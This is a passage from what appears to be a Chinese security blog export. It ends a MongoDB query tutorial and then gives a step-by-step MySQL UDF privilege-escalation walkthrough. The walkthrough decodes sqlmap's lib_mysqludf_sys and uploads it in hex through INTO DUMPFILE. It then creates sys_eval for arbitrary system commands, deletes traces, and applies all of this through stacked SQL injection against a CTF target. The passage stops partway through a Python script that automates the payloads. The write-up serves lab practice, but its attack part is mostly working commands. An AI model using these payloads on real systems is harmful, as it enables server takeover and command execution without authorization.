<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find().limit(2)</span><br><span class="line"></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;), &quot;name&quot; : &quot;shijiange1&quot;, &quot;age&quot; : 20 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e562b3da451c7b659eb4&quot;), &quot;name&quot; : &quot;shijiange2&quot;, &quot;age&quot; : 30 &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>MongoDB进行排序</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find().sort(&#123;age:1&#125;)</span><br><span class="line"></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;), &quot;name&quot; : &quot;shijiange1&quot;, &quot;age&quot; : 20 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e58fb3da451c7b659eba&quot;), &quot;name&quot; : &quot;zhangsan1&quot;, &quot;age&quot; : 20 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e562b3da451c7b659eb4&quot;), &quot;name&quot; : &quot;shijiange2&quot;, &quot;age&quot; : 30 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e567b3da451c7b659eb5&quot;), &quot;name&quot; : &quot;shijiange3&quot;, &quot;age&quot; : 40 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e58ab3da451c7b659eb9&quot;), &quot;name&quot; : &quot;zhangsan2&quot;, &quot;age&quot; : 40 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e56cb3da451c7b659eb6&quot;), &quot;name&quot; : &quot;shijiange4&quot;, &quot;age&quot; : 50 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e57cb3da451c7b659eb7&quot;), &quot;name&quot; : &quot;zhangsan4&quot;, &quot;age&quot; : 50 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e580b3da451c7b659eb8&quot;), &quot;name&quot; : &quot;zhangsan3&quot;, &quot;age&quot; : 50 &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>根据字段进行数字比较查询</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$gt #大于 greatest 方便记忆</span><br><span class="line">$lt #小于 lowest</span><br><span class="line">$gte #大于或等于 greatest equal</span><br><span class="line">$lte #小于或等于  lowest equal</span><br><span class="line">$ne : !&#x3D;、&lt;&gt;</span><br><span class="line">$in : in</span><br><span class="line">$nin: not in</span><br><span class="line">$all: all </span><br><span class="line">$not: 反匹配(1.3.3及以上版本)</span><br></pre></td></tr></table></figure></div>

<p><strong>查询小于30的</strong> </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find(&#123;&quot;age&quot;:&#123;$lt:30&#125;&#125;)</span><br><span class="line"></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;), &quot;name&quot; : &quot;shijiange1&quot;, &quot;age&quot; : 20 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e58fb3da451c7b659eba&quot;), &quot;name&quot; : &quot;zhangsan1&quot;, &quot;age&quot; : 20 &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>多种查询条件之查询姓名为shijiange1的</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find(&#123;name:&#39;shijiange1&#39;&#125;)</span><br><span class="line"></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;), &quot;name&quot; : &quot;shijiange1&quot;, &quot;age&quot; : 20 &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>or查询两条数据</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find(&#123;$or:[&#123;name:&#39;shijiange1&#39;&#125;,&#123;name:&#39;shijiange2&#39;&#125;]&#125;)</span><br><span class="line"></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;), &quot;name&quot; : &quot;shijiange1&quot;, &quot;age&quot; : 20 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e562b3da451c7b659eb4&quot;), &quot;name&quot; : &quot;shijiange2&quot;, &quot;age&quot; : 30 &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>and查询两个同时满足的条件</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find(&#123;$and:[&#123;name:&#39;shijiange1&#39;&#125;,&#123;age:20&#125;]&#125;)</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;), &quot;name&quot; : &quot;shijiange1&quot;, &quot;age&quot; : 20 &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>MongoDB普通正则和扩展正则查询</strong></p>
<p>限制主键为name的数据shijiange[0-9]</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find(&#123;&quot;name&quot;:&#123;$regex:&quot;shijiange[0-9]&quot;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e55db3da451c7b659eb3&quot;), &quot;name&quot; : &quot;shijiange1&quot;, &quot;age&quot; : 20 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e562b3da451c7b659eb4&quot;), &quot;name&quot; : &quot;shijiange2&quot;, &quot;age&quot; : 30 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e567b3da451c7b659eb5&quot;), &quot;name&quot; : &quot;shijiange3&quot;, &quot;age&quot; : 40 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e56cb3da451c7b659eb6&quot;), &quot;name&quot; : &quot;shijiange4&quot;, &quot;age&quot; : 50 &#125;</span><br></pre></td></tr></table></figure></div>

<p>匹配姓名中包含zhangsan的数据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find(&#123;&quot;name&quot;:&#123;$regex:&quot;(zhangsan)&quot;&#125;&#125;)</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e57cb3da451c7b659eb7&quot;), &quot;name&quot; : &quot;zhangsan4&quot;, &quot;age&quot; : 50 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e580b3da451c7b659eb8&quot;), &quot;name&quot; : &quot;zhangsan3&quot;, &quot;age&quot; : 50 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e58ab3da451c7b659eb9&quot;), &quot;name&quot; : &quot;zhangsan2&quot;, &quot;age&quot; : 40 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109e58fb3da451c7b659eba&quot;), &quot;name&quot; : &quot;zhangsan1&quot;, &quot;age&quot; : 20 &#125;</span><br></pre></td></tr></table></figure></div>

<p>利用for循环查询100条测试数据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; for(i&#x3D;1; i&lt;&#x3D;100; i++)&#123; </span><br><span class="line">...  db.myuser.insert(&#123;name:&#39;mytest&#39;+i, age:i&#125;)</span><br><span class="line">... &#125;</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210804094132355.png" alt="image-20210804094132355"></p>
<p>利用count查看当前表中的记录数目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.count()</span><br><span class="line">100 #100条记录</span><br></pre></td></tr></table></figure></div>

<p><strong>范围查询</strong></p>
<p>查询从2到10之间的数据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt; db.myuser.find(&#123;&quot;age&quot;:&#123;$gte:2,$lte:10&#125;&#125;)</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec0d&quot;), &quot;name&quot; : &quot;mytest2&quot;, &quot;age&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec0e&quot;), &quot;name&quot; : &quot;mytest3&quot;, &quot;age&quot; : 3 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec0f&quot;), &quot;name&quot; : &quot;mytest4&quot;, &quot;age&quot; : 4 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec10&quot;), &quot;name&quot; : &quot;mytest5&quot;, &quot;age&quot; : 5 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec11&quot;), &quot;name&quot; : &quot;mytest6&quot;, &quot;age&quot; : 6 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec12&quot;), &quot;name&quot; : &quot;mytest7&quot;, &quot;age&quot; : 7 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec13&quot;), &quot;name&quot; : &quot;mytest8&quot;, &quot;age&quot; : 8 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec14&quot;), &quot;name&quot; : &quot;mytest9&quot;, &quot;age&quot; : 9 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6109f00b92cc83f32e90ec15&quot;), &quot;name&quot; : &quot;mytest10&quot;, &quot;age&quot; : 10 &#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【SQL注入】UDF提权命令执行</title>
    <url>/posts/100.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是udf"><a href="#一、什么是udf" class="headerlink" title="一、什么是udf"></a>一、什么是udf</h1><p> udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p>
<p> udf 文件后缀一般为 dll，由C、C++编写</p>
<h1 id="二、udf在渗透中的作用"><a href="#二、udf在渗透中的作用" class="headerlink" title="二、udf在渗透中的作用"></a>二、udf在渗透中的作用</h1><p> 在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</p>
<h1 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a>三、利用条件</h1><p>利用udf的条件其实还是挺苛刻的</p>
<p><strong>mysql用户权限问题</strong></p>
<ul>
<li><p>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</p>
</li>
<li><p>拥有将udf.dll写入相应目录的权限。</p>
</li>
</ul>
<h1 id="四、数据库版本问题"><a href="#四、数据库版本问题" class="headerlink" title="四、数据库版本问题"></a>四、数据库版本问题</h1><p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>路径</th>
</tr>
</thead>
<tbody><tr>
<td>MySQL &lt; 5.0</td>
<td>导出路径随意；</td>
</tr>
<tr>
<td>5.0 &lt;= MySQL&lt; 5.1</td>
<td>需要导出至目标服务器的系统目录（如：c:/windows/system32/）</td>
</tr>
<tr>
<td>5.1 &lt; MySQL</td>
<td>必须导出到MySQL安装目录下的lib\plugin文件夹下</td>
</tr>
</tbody></table>
<p><strong>一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）</strong></p>
<h1 id="五、本地利用过程"><a href="#五、本地利用过程" class="headerlink" title="五、本地利用过程"></a>五、本地利用过程</h1><p><strong>1、获取Mysql安装路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select @basedir</span><br></pre></td></tr></table></figure></div>

<p><strong>2、查看可操作路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;%secure%&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p>
<p><strong>3、查看plugin目录路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select @@plugin_dir</span><br></pre></td></tr></table></figure></div>

<p><strong>4、将dll上传方式推荐几种</strong></p>
<p>将dll上传到安装路径的方式：</p>
<p>通过webshell上传</p>
<p>以hex方式直接上传</p>
<p><strong>sqlmap中现有的udf文件，分为32位和64位，一定要选择对版本，获取sqlmap的udf方式</strong></p>
<p><strong>5、sqlmap中udf获取方式</strong></p>
<p>自动化注入工具Sqlmap已经集成了此功能。</p>
<p><strong>在 \sqlmap\data\udf\mysql\windows\64目录下存放着lib_mysqludf_sys.dll_</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802180556258.png" alt="image-20210802180556258"></p>
<blockquote>
<ul>
<li><strong>但是sqlmap中自带的shell以及一些二进制文件，为了防止误杀都经过异或编码，不能直接使用</strong></li>
</ul>
</blockquote>
<p><strong>可以利用sqlmap 自带的解码工具cloak.py，在sqlmap\extra\cloak中打开命令行，来对lib_mysqludf_sys.dll_进行解码在，然后在直接利用，输入下面的</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802180926662.png" alt="image-20210802180926662"></p>
<p>接着就会在\sqlmap\data\udf\mysql\windows\64目录下生成一个dll的文件<strong>lib_mysqludf_sys.dll</strong>，这个我们就可以直接拿来利用</p>
<p>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</p>
<p>函数：</p>
<p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
<p>以我windows系统为例，mysql版本为<strong>MySQL5.7.26</strong></p>
<p><strong>注意：攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181450673.png" alt="image-20210802181450673"></p>
<blockquote>
<ul>
<li><strong>直接将刚刚生成的64位windows的dll文件复制到<code>D:\phpstudy8\Extensions\MySQL5.7.26\lib\plugin</code>中，然后再mysql中执行以下语句</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181552843.png" alt="image-20210802181552843"></p>
<blockquote>
<ul>
<li><p>然后就可以任意命令执行了</p>
</li>
<li><p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#39;ipconfig&#39;)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181722479.png" alt="image-20210802181722479"></p>
<h1 id="六、实战情况之一，hex编-解传入mysql系统提权"><a href="#六、实战情况之一，hex编-解传入mysql系统提权" class="headerlink" title="六、实战情况之一，hex编/解传入mysql系统提权"></a><strong>六、实战情况之一，hex编/解传入mysql系统提权</strong></h1><blockquote>
<ul>
<li><strong>本地利用的情况，你得已经上传webshell的情况下才能成功。如果你在sql实战中遇到可以使用outfile等上传文件的情况下，如何利用来系统权限命令执行。下面我们先熟悉一下本地测试一下具体情况</strong></li>
</ul>
</blockquote>
<p><strong>为了将这个转换为十六进制，可以借助mysql中的hex函数，先将udf.dll移动到C盘中，这样路径也清晰一些，然后执行下面命令</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'C:/udf.dll'</span>)) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/udf.txt'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802184049609.png" alt="image-20210802184049609"></p>
<p>成功生成了十六进制形式流</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802184106028.png" alt="image-20210802184106028"></p>
<p><strong>接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。</strong></p>
<p><strong>一、新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> udftmp (c <span class="built_in">BLOB</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>二、在udftmp中写入udf文件内容</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> udftmp <span class="keyword">values</span>(<span class="keyword">unhex</span>(<span class="string">'udf文件的16进制格式'</span>))</span><br></pre></td></tr></table></figure></div>

<p><strong>三、将udf文件内容传入新建的udf文件中，路径根据自己的@@plugin_dir修改 //对于mysql小于5.1的，导出目录为</strong>C:\Windows\或C:\Windows\System32\</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> udftmp <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:/phpstudy8/Extensions/MySQL5.7.26/lib/plugin/udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><strong>四、执行下面语句，就可以system权限下命令任意执行，这电脑就沦陷了，执行命令上面已经说过，就不复述了</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><strong>五、删除痕迹，做好事不留名</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> udftmp</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">'ipconfig'</span>);</span><br><span class="line">返回网卡信息</span><br></pre></td></tr></table></figure></div>

<p>本地实践了之后，基础知识差不多了解我们做一个实战靶场</p>
<p><strong>题目代码</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215056685.png" alt="image-20210802215056685"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">$sql = "<span class="keyword">select</span> <span class="keyword">id</span>,username,pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'".$id."'</span> <span class="keyword">limit</span> <span class="number">1</span>;";</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>测试了一下，明显存在堆叠注入，刚好可以利用堆叠注入，来进行udf来进行命令执行，<strong>测试，过滤information、and、or等各种语句无法布尔盲注、时间盲注、报错注入等</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215137822.png" alt="image-20210802215137822"> </p>
<p><strong>好了，废话不多说直接看一下@@plugin_dir的路径来命令执行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215552429.png" alt="image-20210802215552429"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">目录&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>对方是linux,当然写 一个脚本跑会快一些，我先手工实操一遍，之后就用脚本梭哈，首先根据我之前的方法生成64位linux的udf.so的十六进制形式</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803101639156.png" alt="image-20210803101639156"></p>
<p>由于这是get传参，是有长度限制的，16081的超过限制，会直接被ban了，所以我分按6000长度分为了三个文本文件里面装了udf十六进制三个部分</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803101807533.png" alt="image-20210803101807533"></p>
<p>接着我们将a、b、c三个中里面的十六进制导入到被攻击的机器中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'a部分十六进制'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'/usr/lib/mariadb/plugin/a.txt'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102052966.png" alt="image-20210803102052966"></p>
<p><strong>为了确认我们是否已经导入load_file来判断</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/usr/lib/mariadb/plugin/a.txt'</span>)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102140360.png" alt="image-20210803102140360"></p>
<p><strong>明显导入成功，照葫芦画瓢，将剩下的b和c导入进去</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102422360.png" alt="image-20210803102422360"></p>
</blockquote>
<p>当明显确定已经都导入成功了a、b、c三部分udf十六进制内容，接着来就是导入so到这个目录就可以命令执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select unhex(concat(load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;a.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;b.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;c.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;d.txt&#39;))) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so&#39;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102536467.png" alt="image-20210803102536467"></p>
<p><strong>最后我们创建sys_eval这个函数来进行命令执行</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;</span><br></pre></td></tr></table></figure></div>

<p><strong>明显获得了命令执行的权限</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102656908.png" alt="image-20210803102656908"></p>
<p><strong>我们可以看看ip配置</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102747630.png" alt="image-20210803102747630"></p>
<p><strong>接着就拿这题的flag</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803103022002.png" alt="image-20210803103022002"></p>
<h1 id="七、写个脚本跑"><a href="#七、写个脚本跑" class="headerlink" title="七、写个脚本跑"></a>七、写个脚本跑</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://419e5714-21cb-4a29-82d4-cecf0bb82bf7.challenge.ctf.show:8080/api/"</span></span><br><span class="line">payload = <span class="string">"?id=1';select '&#123;&#125;' into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+"</span></span><br><span class="line">acquire = <span class="string">"?id=1';select load_file('/usr/lib/mariadb/plugin/&#123;&#125;.txt')--+"</span></span><br><span class="line">text = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span 